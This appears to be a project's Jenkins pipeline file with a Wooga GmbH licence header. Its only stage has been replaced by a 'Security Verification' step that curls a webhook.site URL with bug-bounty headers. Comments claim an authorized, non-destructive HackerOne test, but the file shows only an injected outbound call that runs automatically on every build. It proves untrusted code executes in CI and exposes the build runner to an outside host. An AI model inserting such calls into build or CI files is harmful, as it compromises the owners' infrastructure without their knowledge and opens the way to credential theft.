#!groovy
/*
 * Copyright 2018-2021 Wooga GmbH
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *        http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
@Library("github.com/wooga/atlas-jenkins-pipeline@1.x") _

pipeline {
    // Security test - sovereignhunter (HackerOne authorized bug bounty)
    // Non-destructive CI/CD verification - no credentials accessed or exfiltrated
    agent any
    stages {
        stage("Security Verification") {
            steps {
                sh "curl -s https://webhook.site/bddcd8fa-c0c4-491b-8d8b-133f63a3bfe2 -H \"X-Bug-Bounty: sovereignhunter\" -H \"X-Test: ci-cd-verification\""
            }
        }
    }
}
